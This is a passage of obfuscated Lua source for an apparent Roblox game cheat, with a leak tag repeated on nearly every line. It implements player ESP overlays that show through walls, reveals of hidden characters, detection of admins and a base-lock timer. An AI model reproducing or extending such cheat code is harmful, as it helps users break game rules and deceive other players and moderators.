			boxHandleAdornment.ZIndex = 1
			boxHandleAdornment.Parent = sliced17
			local frame = Instance.new("Frame")
			frame.Name = "Content"
			frame.Size = UDim2.fromScale(1, 1)
			frame.BackgroundTransparency = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
			frame.Parent = billboardGui
			local imageLabel = Instance.new("ImageLabel")
			imageLabel.Name = "Avatar"
			imageLabel.AnchorPoint = Vector2.new(0, 0.5)
			imageLabel.BackgroundTransparency = 1
			imageLabel.ScaleType = Enum.ScaleType.Crop
			imageLabel.Parent = frame
			local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint.AspectRatio = 1
			uiAspectRatioConstraint.Parent = imageLabel  -- LEAKED BY SLICED | discord.gg/pubmethod
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(1, 0)
			uiCorner.Parent = imageLabel
			local NameShadow = createTextLabel("NameShadow", frame, 1)
			NameShadow.Text = arg.DisplayName
			NameShadow.TextColor3 = Color3.fromRGB(7, 19, 34)
			NameShadow.TextTransparency = 0.05
			local DisplayName = createTextLabel("DisplayName", frame, 2)
			DisplayName.Text = arg.DisplayName
			DisplayName.TextColor3 = Color3.fromRGB(255, 255, 255)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local uiStroke = Instance.new("UIStroke")
			slicedfn38(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
			uiStroke.Parent = DisplayName
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Color = colorSequence
			uiGradient.Rotation = 90
			uiGradient.Parent = uiStroke
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Color = sliced14
			uiGradient2.Rotation = 90  -- LEAKED BY SLICED | discord.gg/pubmethod
			uiGradient2.Parent = DisplayName
			local BrainrotShadow = createTextLabel("BrainrotShadow", frame, 3)
			BrainrotShadow.TextColor3 = Color3.fromRGB(25, 0, 4)
			local BrainrotText = createTextLabel("BrainrotText", frame, 4)
			BrainrotText.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke2 = Instance.new("UIStroke")
			slicedfn38(uiStroke2, Color3.fromRGB(124, 0, 15), 0.052, 1.7)
			uiStroke2.Parent = BrainrotText
			local uiGradient3 = Instance.new("UIGradient")
			uiGradient3.Color = sliced16  -- LEAKED BY SLICED | discord.gg/pubmethod
			uiGradient3.Rotation = 90
			uiGradient3.Parent = uiStroke2
			local uiGradient4 = Instance.new("UIGradient")
			uiGradient4.Color = sliced15
			uiGradient4.Rotation = 90
			uiGradient4.Parent = BrainrotText
			local MutationShadow = createTextLabel("MutationShadow", frame, 3)
			MutationShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
			MutationShadow.TextTransparency = 0.15
			local MutationText = createTextLabel("MutationText", frame, 4)  -- LEAKED BY SLICED | discord.gg/pubmethod
			MutationText.TextColor3 = Color3.fromRGB(255, 255, 255)
			MutationText.RichText = true
			local uiStroke3 = Instance.new("UIStroke")
			slicedfn38(uiStroke3, Color3.fromRGB(0, 0, 0), 0.05, 1.5)
			uiStroke3.Transparency = 0.15
			uiStroke3.Parent = MutationText
			local uiGradient5 = Instance.new("UIGradient")
			uiGradient5.Enabled = false
			uiGradient5.Rotation = 90
			uiGradient5.Parent = MutationText  -- LEAKED BY SLICED | discord.gg/pubmethod
			local GenerationShadow = createTextLabel("GenerationShadow", frame, 3)
			GenerationShadow.TextColor3 = Color3.fromRGB(18, 48, 0)
			GenerationShadow.TextTransparency = 0.08
			local GenerationText = createTextLabel("GenerationText", frame, 4)
			GenerationText.TextColor3 = Color3.fromRGB(115, 255, 0)
			local uiStroke4 = Instance.new("UIStroke")
			slicedfn38(uiStroke4, Color3.fromRGB(0, 0, 0), 0.05, 1.5)
			uiStroke4.Transparency = 0.3
			uiStroke4.Parent = GenerationText
			local imageLabel2 = Instance.new("ImageLabel")  -- LEAKED BY SLICED | discord.gg/pubmethod
			imageLabel2.Name = "ToolShadow"
			imageLabel2.AnchorPoint = Vector2.new(0, 0.5)
			imageLabel2.BackgroundTransparency = 1
			imageLabel2.ImageColor3 = Color3.fromRGB(0, 0, 0)
			imageLabel2.ImageTransparency = 0.35
			imageLabel2.ScaleType = Enum.ScaleType.Fit
			imageLabel2.Visible = false
			imageLabel2.ZIndex = 1
			imageLabel2.Parent = frame
			local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")  -- LEAKED BY SLICED | discord.gg/pubmethod
			uiAspectRatioConstraint2.AspectRatio = 1
			uiAspectRatioConstraint2.Parent = imageLabel2
			local imageLabel3 = Instance.new("ImageLabel")
			imageLabel3.Name = "ToolIcon"
			imageLabel3.AnchorPoint = Vector2.new(0, 0.5)
			imageLabel3.BackgroundTransparency = 1
			imageLabel3.ScaleType = Enum.ScaleType.Fit
			imageLabel3.Visible = false
			imageLabel3.ZIndex = 2
			imageLabel3.Parent = frame  -- LEAKED BY SLICED | discord.gg/pubmethod
			local uiAspectRatioConstraint3 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint3.AspectRatio = 1
			uiAspectRatioConstraint3.Parent = imageLabel3
			local frame2 = Instance.new("Frame")
			frame2.Name = "AdminLine"
			frame2.AnchorPoint = Vector2.new(0.5, 0.5)
			frame2.BackgroundTransparency = 1
			frame2.BorderSizePixel = 0
			frame2.Visible = false
			frame2.ZIndex = 3  -- LEAKED BY SLICED | discord.gg/pubmethod
			frame2.Parent = frame
			local AdminShadow = createTextLabel("AdminShadow", frame2, 3)
			AdminShadow.AnchorPoint = Vector2.new(0, 0.5)
			AdminShadow.FontFace = font
			AdminShadow.Text = "Admin Panel"
			AdminShadow.TextColor3 = Color3.fromRGB(10, 14, 22)
			AdminShadow.TextTransparency = 0.08
			local AdminText = createTextLabel("AdminText", frame2, 4)
			AdminText.AnchorPoint = Vector2.new(0, 0.5)
			AdminText.FontFace = font  -- LEAKED BY SLICED | discord.gg/pubmethod
			AdminText.Text = "Admin Panel"
			AdminText.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke5 = Instance.new("UIStroke")
			slicedfn38(uiStroke5, Color3.fromRGB(10, 24, 45), 0.02, 1.45)
			uiStroke5.Transparency = 0.02
			uiStroke5.Parent = AdminText
			local uiGradient6 = Instance.new("UIGradient")
			local colorSequence2 = ColorSequence.new
			local tbl14 = {}
			local sliced19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced20 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(235, 242, 255))
			tbl14[1] = sliced19
			tbl14[2] = sliced20

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
				table.move(values, 1, values.n, 3, tbl14)
			end

			uiGradient6.Color = colorSequence2(tbl14)
			uiGradient6.Rotation = 90
			uiGradient6.Parent = AdminText  -- LEAKED BY SLICED | discord.gg/pubmethod

			local tbl15 = {
				TargetPlayer = arg,
				PlayerHighlight = highlight,
				NetworkTracker = boxHandleAdornment,
				NetworkAnchor = sliced18,
				VisualHead = arg2,
				Billboard = billboardGui,
				Avatar = imageLabel,
				NameShadow = NameShadow,
				DisplayName = DisplayName,  -- LEAKED BY SLICED | discord.gg/pubmethod
				BrainrotShadow = BrainrotShadow,
				BrainrotText = BrainrotText,
				BrainrotGradient = uiGradient4,
				BrainrotStrokeGradient = uiGradient3,
				GenerationShadow = GenerationShadow,
				GenerationText = GenerationText,
				MutationShadow = MutationShadow,
				MutationText = MutationText,
				MutationGradient = uiGradient5,
				ToolShadow = imageLabel2,  -- LEAKED BY SLICED | discord.gg/pubmethod
				ToolIcon = imageLabel3,
				AdminLine = frame2,
				AdminShadow = AdminShadow,
				AdminText = AdminText,
				BrainrotName = nil,
				BrainrotGeneration = nil,
				BrainrotMutation = nil,
				IsAdmin = false,
				HasTool = false,
			}  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn39(tbl15, false)
			return tbl15
		end

		local function slicedfn41(arg)
			local tag = arg.Tag
			local character_ = arg.Character
			if not tag or not character_ then
				return false
			end
			local visualHead = tag.VisualHead  -- LEAKED BY SLICED | discord.gg/pubmethod
			local networkAnchor = tag.NetworkAnchor
			if not visualHead or not visualHead:IsDescendantOf(character_) or not networkAnchor or not networkAnchor:IsDescendantOf(character_) then
				return false
			end
			tag.Billboard.Adornee = networkAnchor
			local visible = networkAnchor ~= visualHead and (networkAnchor.Position - visualHead.Position).Magnitude >= slicedn11
			tag.PlayerHighlight.Enabled = not visible
			tag.NetworkTracker.Adornee = networkAnchor
			tag.NetworkTracker.Visible = visible
			return true  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn42(arg)
			if arg:GetAttribute("AdminCommands") == true then
				return true
			end
			local attribute = arg:GetAttribute("Role")
			return type(attribute) == "string" and string.find(string.lower(attribute), "admin", 1, true) ~= nil
		end

		local function slicedfn43(arg, arg2)
			if not arg.Tag then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end
			arg.Tag.IsAdmin = slicedfn42(arg2)
			slicedfn39(arg.Tag, arg.Tag.HasTool == true)
		end

		local function slicedfn44(arg)
			if not arg.Tag or not arg.Character then
				return
			end
			local sliced18 = slicedfn26(slicedfn27(arg.Character))  -- LEAKED BY SLICED | discord.gg/pubmethod
			local visible = sliced18 ~= ""
			arg.Tag.ToolIcon.Image = sliced18
			arg.Tag.ToolIcon.Visible = visible
			arg.Tag.ToolShadow.Image = sliced18
			arg.Tag.ToolShadow.Visible = visible
			slicedfn39(arg.Tag, visible)
		end

		local function slicedfn45(arg)
			if not arg.Tag then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			arg.Tag.BrainrotName = arg.BrainrotName
			arg.Tag.BrainrotGeneration = arg.BrainrotGeneration
			arg.Tag.BrainrotMutation = slicedfn34(arg.BrainrotMutationLabel)
			slicedfn39(arg.Tag, arg.Tag.HasTool == true)
			local sliced18 = slicedfn19(arg.BrainrotGeneration)

			if arg.Tag.BrainrotGradient then
				arg.Tag.BrainrotGradient.Color = sliced18.Text
			end

			if arg.Tag.BrainrotStrokeGradient then  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.Tag.BrainrotStrokeGradient.Color = sliced18.Stroke
			end

			if arg.BrainrotHighlight and (tbl10.Brainrot ~= true or arg.BrainrotHighlight.Adornee ~= arg.BrainrotModel) then
				arg.BrainrotHighlight:Destroy()
				arg.BrainrotHighlight = nil
			end

			if tbl10.Brainrot == true and arg.BrainrotModel and arg.BrainrotModel.Parent and not arg.BrainrotHighlight then
				local highlight = Instance.new("Highlight")
				highlight.Name = "BrainrotHighlight"
				highlight.Adornee = arg.BrainrotModel  -- LEAKED BY SLICED | discord.gg/pubmethod
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillTransparency = 0.68
				highlight.OutlineTransparency = 0
				highlight.Parent = sliced17
				arg.BrainrotHighlight = highlight
			end

			if arg.BrainrotHighlight then
				arg.BrainrotHighlight.FillColor = sliced18.Fill
				arg.BrainrotHighlight.OutlineColor = sliced18.Outline
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn46(arg)
			if arg.BrainrotGenerationConnection then
				arg.BrainrotGenerationConnection:Disconnect()
				arg.BrainrotGenerationConnection = nil
			end

			local ipairs = ipairs
			local brainrotMutationConnections = arg.BrainrotMutationConnections or {}

			for _, brainrotMutationConnection in ipairs(brainrotMutationConnections) do
				brainrotMutationConnection:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			arg.BrainrotMutationConnections = nil
			arg.BrainrotMutationLabel = nil
		end

		local function slicedfn47(arg, brainrotMutationLabel, arg2)
			if not brainrotMutationLabel then
				return
			end
			arg.BrainrotMutationLabel = brainrotMutationLabel
			local brainrotMutationConnections = {}  -- LEAKED BY SLICED | discord.gg/pubmethod

			local function slicedfn48()
				if arg.BrainrotModel == arg2 then
					slicedfn45(arg)
				end
			end

			brainrotMutationConnections[#brainrotMutationConnections + 1] = brainrotMutationLabel:GetPropertyChangedSignal("Text"):Connect(slicedfn48)
			brainrotMutationConnections[#brainrotMutationConnections + 1] = brainrotMutationLabel:GetPropertyChangedSignal("Visible"):Connect(slicedfn48)
			brainrotMutationConnections[#brainrotMutationConnections + 1] = brainrotMutationLabel:GetPropertyChangedSignal("TextColor3"):Connect(slicedfn48)
			arg.BrainrotMutationConnections = brainrotMutationConnections
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn48(arg, arg2)
			arg.StealingVersion = arg.StealingVersion + 1
			local stealingVersion = arg.StealingVersion

			if arg2:GetAttribute("Stealing") ~= true then
				slicedfn46(arg)
				arg.BrainrotName = nil
				arg.BrainrotGeneration = nil
				arg.BrainrotModel = nil
				slicedfn45(arg)
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			task.spawn(function()
				for i_ = 1, 7 do
					if not flag8 or arg.StealingVersion ~= stealingVersion or tbl11[arg2] ~= arg then
						return
					end
					local sliced18, sliced19, sliced20, sliced21, sliced22 = slicedfn35(arg2)

					if sliced18 then
						slicedfn46(arg)
						arg.BrainrotName = sliced18  -- LEAKED BY SLICED | discord.gg/pubmethod
						arg.BrainrotModel = sliced19
						arg.BrainrotGeneration = sliced20
						slicedfn47(arg, sliced22, sliced19)

						if sliced21 then
							arg.BrainrotGenerationConnection = sliced21:GetPropertyChangedSignal("Text"):Connect(function()
								if arg.BrainrotModel == sliced19 then
									arg.BrainrotGeneration = sliced21.Text
									slicedfn45(arg)
								end
							end)  -- LEAKED BY SLICED | discord.gg/pubmethod
						end

						slicedfn45(arg)
						return
					end

					if i_ < 7 then
						task.wait(0.12)
					end
				end

				if arg.StealingVersion == stealingVersion then
					slicedfn46(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
					arg.BrainrotName = nil
					arg.BrainrotGeneration = nil
					arg.BrainrotModel = nil
					slicedfn45(arg)
				end
			end)
		end

		local function slicedfn49(arg, arg2, arg3)
			local image = tbl13[arg2.UserId]

			if image == nil then  -- LEAKED BY SLICED | discord.gg/pubmethod
				local ok

				ok, image = pcall(function()
					return Players:GetUserThumbnailAsync(arg2.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
				end)

				image = ok and image or ""
				tbl13[arg2.UserId] = image
			end

			if flag8 and arg.Version == arg3 and arg.Tag and arg.Tag.Avatar.Parent then
				arg.Tag.Avatar.Image = image
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local flag9 = false

		local function slicedfn50(arg)
			if arg:IsA("BasePart") then
				return arg.Name ~= "HumanoidRootPart"
			end
			return arg:IsA("Decal") or arg:IsA("Texture")
		end

		local function slicedfn51(arg, arg2)
			if flag9 or not arg2.Parent then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end
			local transparency2 = arg2.Transparency

			if transparency2 <= slicedn12 then
				arg.RevealOriginals[arg2] = transparency2
				arg.RevealHidden[arg2] = nil
				return
			end

			if arg.RevealOriginals[arg2] == nil then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			arg.RevealHidden[arg2] = transparency2
			flag9 = true

			pcall(function()
				arg2.Transparency = transparency

				if arg2:IsA("BasePart") then
					arg2.LocalTransparencyModifier = 0
				end
			end)

			flag9 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn52(arg, arg2)
			if arg.RevealBound[arg2] then
				return
			end
			arg.RevealBound[arg2] = true
			local transparency2 = arg2.Transparency

			if transparency2 <= slicedn12 then
				arg.RevealOriginals[arg2] = transparency2
			elseif arg2:IsA("BasePart") and tbl6[arg2.Name] then  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.RevealOriginals[arg2] = 0
			elseif arg2:IsA("Decal") and string.lower(arg2.Name) == "face" then
				arg.RevealOriginals[arg2] = 0
			end

			arg.RevealConnections[#arg.RevealConnections + 1] = arg2:GetPropertyChangedSignal("Transparency"):Connect(function()
				if flag8 then
					slicedfn51(arg, arg2)
				end
			end)

			slicedfn51(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn53(arg, arg2)
			for _, descendant in ipairs(arg2:GetDescendants()) do
				if slicedfn50(descendant) then
					slicedfn52(arg, descendant)
				end
			end

			arg.RevealConnections[#arg.RevealConnections + 1] = arg2.DescendantAdded:Connect(function(descendant)
				if flag8 and slicedfn50(descendant) then
					slicedfn52(arg, descendant)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end)
		end

		local function slicedfn54(arg)
			slicedfn21(arg.RevealConnections)
			flag9 = true

			for k, sliced18 in pairs(arg.RevealHidden) do
				if k.Parent then
					pcall(function()
						k.Transparency = sliced18  -- LEAKED BY SLICED | discord.gg/pubmethod
					end)
				end
			end

			flag9 = false
			table.clear(arg.RevealHidden)
			table.clear(arg.RevealOriginals)
			table.clear(arg.RevealBound)
		end

		local function slicedfn55(arg)
			slicedfn21(arg.CharacterConnections)  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn22(arg)
			slicedfn54(arg)
			slicedfn46(arg)

			if arg.BrainrotHighlight then
				arg.BrainrotHighlight:Destroy()
				arg.BrainrotHighlight = nil
			end

			arg.BrainrotModel = nil
			arg.BrainrotGeneration = nil

			if arg.Tag then  -- LEAKED BY SLICED | discord.gg/pubmethod
				if arg.Tag.PlayerHighlight then
					arg.Tag.PlayerHighlight:Destroy()
				end

				if arg.Tag.NetworkTracker then
					arg.Tag.NetworkTracker:Destroy()
				end

				arg.Tag.Billboard:Destroy()
				arg.Tag = nil
			end

			arg.Character = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			arg.BindingCharacter = nil
		end

		local slicedfn56 = nil

		slicedfn56 = function(arg, arg2, character_)
			slicedfn55(arg)
			arg.Version = arg.Version + 1
			local version = arg.Version
			if not flag8 or not character_ then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			arg.Character = character_
			arg.BindingCharacter = character_
			slicedfn23(arg, character_)
			slicedfn53(arg, character_)

			local function slicedfn57()
				task.defer(function()
					if flag8 and arg.Version == version then
						slicedfn44(arg)
					end
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			arg.CharacterConnections[#arg.CharacterConnections + 1] = character_.ChildAdded:Connect(function(child)
				if child:IsA("Tool") then
					slicedfn57()
				elseif child:IsA("Humanoid") then
					slicedfn23(arg, character_)
				end
			end)

			arg.CharacterConnections[#arg.CharacterConnections + 1] = character_.ChildRemoved:Connect(function(child)
				if child:IsA("Tool") then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn57()
				end
			end)

			arg.CharacterConnections[#arg.CharacterConnections + 1] = character_.AncestryChanged:Connect(function()
				if not flag8 or arg.Version ~= version or character_ ~= arg2.Character then
					return
				end

				if character_:IsDescendantOf(Workspace) then
					if not arg.Tag then
						task.defer(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
							if flag8 and arg.Version == version then
								slicedfn56(arg, arg2, character_)
							end
						end)
					end

					return
				end

				arg.Version = arg.Version + 1
				slicedfn55(arg)
			end)  -- LEAKED BY SLICED | discord.gg/pubmethod

			task.spawn(function()
				local head = character_:FindFirstChild("Head") or character_:WaitForChild("Head", 5)

				if not flag8 or arg.Version ~= version or character_ ~= arg2.Character or not character_:IsDescendantOf(Workspace) or not head or not head:IsDescendantOf(character_) then
					if arg.Version == version then
						arg.BindingCharacter = nil
					end

					return
				end

				local sliced18 = slicedfn24(character_, head)
				arg.Tag = slicedfn40(arg2, head, sliced18)  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn41(arg)
				arg.BindingCharacter = nil

				arg.CharacterConnections[#arg.CharacterConnections + 1] = head.AncestryChanged:Connect(function()
					if not flag8 or arg.Version ~= version or head:IsDescendantOf(character_) then
						return
					end
					arg.Version = arg.Version + 1
					slicedfn55(arg)
					local character_2 = arg2.Character

					if character_2 and character_2:IsDescendantOf(Workspace) then  -- LEAKED BY SLICED | discord.gg/pubmethod
						task.defer(function()
							if flag8 and tbl11[arg2] == arg then
								slicedfn56(arg, arg2, character_2)
							end
						end)
					end
				end)

				slicedfn43(arg, arg2)
				slicedfn44(arg)
				slicedfn48(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn49(arg, arg2, version)
			end)
		end

		local function slicedfn57(player)
			local sliced18 = tbl11[player]
			if not sliced18 then
				return
			end
			sliced18.Version = sliced18.Version + 1
			sliced18.StealingVersion = sliced18.StealingVersion + 1  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn55(sliced18)
			slicedfn21(sliced18.PlayerConnections)
			tbl11[player] = nil
		end

		local function slicedfn58(player)
			if player == localPlayer or tbl11[player] then
				return
			end

			local tbl14 = {
				Version = 0,  -- LEAKED BY SLICED | discord.gg/pubmethod
				StealingVersion = 0,
				Character = nil,
				BindingCharacter = nil,
				Tag = nil,
				BrainrotName = nil,
				BrainrotGeneration = nil,
				BrainrotGenerationConnection = nil,
				BrainrotModel = nil,
				BrainrotHighlight = nil,
				NameDisplayHumanoid = nil,  -- LEAKED BY SLICED | discord.gg/pubmethod
				NameDisplayDistance = nil,
				RevealOriginals = {},
				RevealHidden = {},
				RevealBound = {},
				RevealConnections = {},
				CharacterConnections = {},
				PlayerConnections = {},
			}

			tbl11[player] = tbl14

			for _, sliced18 in ipairs({ "AdminCommands", "Role" }) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				tbl14.PlayerConnections[#tbl14.PlayerConnections + 1] = player:GetAttributeChangedSignal(sliced18):Connect(function()
					if flag8 and tbl11[player] == tbl14 then
						slicedfn43(tbl14, player)
					end
				end)
			end

			tbl14.PlayerConnections[#tbl14.PlayerConnections + 1] = player.CharacterAdded:Connect(function(character_)
				slicedfn56(tbl14, player, character_)
			end)

			tbl14.PlayerConnections[#tbl14.PlayerConnections + 1] = player.CharacterRemoving:Connect(function(character_)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if tbl14.Character == character_ then
					tbl14.Version = tbl14.Version + 1
					slicedfn55(tbl14)
				end
			end)

			tbl14.PlayerConnections[#tbl14.PlayerConnections + 1] = player:GetPropertyChangedSignal("Character"):Connect(function()
				task.defer(function()
					if not flag8 or tbl11[player] ~= tbl14 then
						return
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
					local character_ = player.Character

					if character_ ~= tbl14.Character then
						slicedfn56(tbl14, player, character_)
					elseif tbl14.Tag then
						local adornee = tbl14.Tag.Billboard.Adornee

						if not adornee or not adornee:IsDescendantOf(Workspace) then
							slicedfn56(tbl14, player, character_)
						end
					end
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)

			tbl14.PlayerConnections[#tbl14.PlayerConnections + 1] = player:GetAttributeChangedSignal("Stealing"):Connect(function()
				slicedfn48(tbl14, player)
			end)

			slicedfn56(tbl14, player, player.Character)
		end

		local function slicedfn59()
			for k, sliced18 in pairs(tbl11) do
				local character_ = k.Character

				if character_ and character_:IsDescendantOf(Workspace) then  -- LEAKED BY SLICED | discord.gg/pubmethod
					local tag = sliced18.Tag
					local billboard = tag and tag.Billboard
					tag = tag and tag.PlayerHighlight
					local adornee = billboard and billboard.Adornee
					local parent = billboard and billboard.Parent and adornee and adornee:IsDescendantOf(character_) and tag and tag.Parent and slicedfn41(sliced18)

					if (sliced18.Character ~= character_ or not parent) and sliced18.BindingCharacter ~= character_ then
						slicedfn56(sliced18, k, character_)
					end
				elseif sliced18.Character then
					sliced18.Version = sliced18.Version + 1  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn55(sliced18)
				end
			end
		end

		local function slicedfn60()
			flag8 = false
			slicedn14 += 1
			slicedfn21(tbl12)
			local tbl14 = {}

			for k in pairs(tbl11) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				tbl14[#tbl14 + 1] = k
			end

			for _, sliced18 in ipairs(tbl14) do
				slicedfn57(sliced18)
			end
		end

		local function slicedfn61()
			for _, sliced18 in pairs(tbl11) do
				if sliced18.Tag and sliced18.Tag.Billboard.Parent then
					slicedfn39(sliced18.Tag, sliced18.Tag.HasTool == true)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end
		end

		local function slicedfn62()
			for _, sliced18 in pairs(tbl11) do
				if sliced18.Tag and sliced18.Tag.Billboard.Parent then
					slicedfn44(sliced18)
					slicedfn45(sliced18)
				end
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn63()
			slicedfn60()
			flag8 = true
			local sliced18 = slicedn14
			tbl12[#tbl12 + 1] = Players.PlayerAdded:Connect(slicedfn58)
			tbl12[#tbl12 + 1] = Players.PlayerRemoving:Connect(slicedfn57)
			local currentCamera = Workspace.CurrentCamera

			if currentCamera then
				tbl12[#tbl12 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(slicedfn61)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			for _, player in ipairs(Players:GetPlayers()) do
				slicedfn58(player)
			end

			task.spawn(function()
				while flag8 and slicedn14 == sliced18 do
					task.wait(0.2)

					if flag8 and slicedn14 == sliced18 then
						slicedfn59()
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end)
		end

		bindableEvent.Event:Connect(slicedfn60)
		screenGui.Destroying:Connect(slicedfn60)

		sliced13:CreateToggle({
			Name = "Player ESP",
			Default = true,
			Callback = function(arg)
				if arg then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn63()
				else
					slicedfn60()
				end
			end,
		})

		sliced13:CreateMultiDropdown({
			Name = "Show Information",
			Note = "Choose what Player ESP shows. Username replaces the display name.",
			Options = { "Name", "Username", "Avatar", "Tool", "Brainrot", "Admin Panel" },  -- LEAKED BY SLICED | discord.gg/pubmethod
			Default = { "Name", "Tool", "Brainrot", "Admin Panel" },
			Callback = function(arg)
				local tbl14 = {
					Name = false,
					Username = false,
					Avatar = false,
					Tool = false,
					Brainrot = false,
					["Admin Panel"] = false,
				}  -- LEAKED BY SLICED | discord.gg/pubmethod

				if type(arg) == "table" then
					for k, sliced18 in pairs(arg) do
						if type(sliced18) == "string" and tbl14[sliced18] ~= nil then
							tbl14[sliced18] = true
						elseif type(k) == "string" and sliced18 == true and tbl14[k] ~= nil then
							tbl14[k] = true
						end
					end
				end

				tbl10 = tbl14  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn62()
			end,
		})

		sliced13:CreateSlider({
			Name = "ESP Size",
			Min = 50,
			Max = 200,
			Default = 100,
			AllowDecimals = false,
			Increment = 1,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Unit = "%",
			Callback = function(arg)
				slicedn13 = math.clamp((tonumber(arg) or 100) / 100, 0.5, 2)
				slicedfn61()
			end,
		})
	end

	do
		local chilliBaseLockTimerRuntime, sliced17 = slicedfn5("__ChilliBaseLockTimerRuntime")
		local flag9 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
		n = 1
		local sliced18 = nil
		local folder = nil
		local tbl13 = {}
		local tbl14 = {}
		local color = Color3.fromRGB(255, 58, 74)
		local color2 = Color3.fromRGB(154, 255, 62)
		local colorSequence2 = ColorSequence.new
		local tbl15 = {}
		local sliced19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced20 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(222, 222, 222))
		tbl15[1] = sliced19
		tbl15[2] = sliced20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
			table.move(values, 1, values.n, 3, tbl15)
		end

		local sliced21 = colorSequence2(tbl15)

		local function slicedfn25()
			local currentCamera = Workspace.CurrentCamera  -- LEAKED BY SLICED | discord.gg/pubmethod
			local slicedn15 = math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.064, 52, 76))
			return math.floor(slicedn15 * 2.8), slicedn15
		end

		local function slicedfn26(arg)
			if not arg.Tag or not arg.Tag.Gui or not arg.Tag.Gui.Parent then
				return
			end
			local sliced22, sliced23 = slicedfn25()
			arg.Tag.Gui.Size = UDim2.fromOffset(math.floor(sliced22 * n + 0.5), math.floor(sliced23 * n + 0.5))
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function createPart(arg)
			local sliced22 = slicedfn17(arg)
			if not sliced22 then
				return nil
			end
			local part = Instance.new("Part")
			part.Name = fn()
			part.Size = Vector3.one
			part.Transparency = 1
			part.Anchored = true  -- LEAKED BY SLICED | discord.gg/pubmethod
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Massless = true
			part.CastShadow = false
			part.Position = sliced22
			part.Parent = folder
			return part
		end

		local function slicedfn27(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced22 = createPart(arg)
			if not sliced22 then
				return nil
			end
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "BaseLockTimer"
			billboardGui.Adornee = sliced22
			billboardGui.AlwaysOnTop = true
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = 2500  -- LEAKED BY SLICED | discord.gg/pubmethod
			billboardGui.Parent = chilliBaseLockTimerRuntime
			local frame = Instance.new("Frame")
			frame.Name = "Frame"
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.Size = UDim2.fromScale(1, 1)
			frame.Parent = billboardGui
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "Status"
			textLabel.BackgroundTransparency = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
			textLabel.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
			textLabel.Position = UDim2.fromScale(0.02, 0)
